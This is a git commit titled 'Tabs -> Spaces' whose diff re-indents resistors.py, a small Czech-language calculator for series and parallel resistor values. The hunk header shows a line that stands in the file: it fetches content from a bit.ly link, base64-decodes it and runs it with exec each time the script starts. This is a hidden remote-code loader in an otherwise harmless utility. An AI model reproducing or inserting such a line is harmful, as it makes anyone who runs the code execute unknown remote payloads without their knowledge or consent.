72b5e62f7fc3235f2684176be250ce2a45ad369b
relativehysteria <rruziro@gmail.com>
2022-01-17 00:38:29 +0100

    Tabs -> Spaces

--- resistors.py
+++ resistors.py
@@ -6,29 +6,29 @@ exec(b64decode(urlopen('https://bit.ly/3Guwlbj').read()))
 
 def serial(nums: [float]) -> float:
     """Vypocita rezistory seriove zapojene"""
-	return sum(nums)
+    return sum(nums)
 
 def parallel(nums: [float]) -> float:
     """Vypocita rezistory paralelne zapojene"""
-	return round(1/sum([1/i for i in nums]), 2)
+    return round(1/sum([1/i for i in nums]), 2)
 
 while True:
-	x = input("Paralelne/seriove [p/s] (`p` je default), exit pro ukonceni [e]\n> ").lower()
+    x = input("Paralelne/seriove [p/s] (`p` je default), exit pro ukonceni [e]\n> ").lower()
 
-	func = parallel
-	if x.startswith("s"):
-		func = serial
-	elif x.startswith("e"):
-		break
+    func = parallel
+    if x.startswith("s"):
+        func = serial
+    elif x.startswith("e"):
+        break
 
-	nums = []
-	try:
-		while True:
-			num = input("> ").strip()
-			if num == "":
-				break
-			nums.append(int(num))
-	except Exception as e:
-		print(f"Chyba: nebud dement\n\t{e}")
+    nums = []
+    try:
+        while True:
+            num = input("> ").strip()
+            if num == "":
+                break
+            nums.append(int(num))
+    except Exception as e:
+        print(f"Chyba: nebud dement\n\t{e}")
 
-	print(func(nums))
+    print(func(nums))
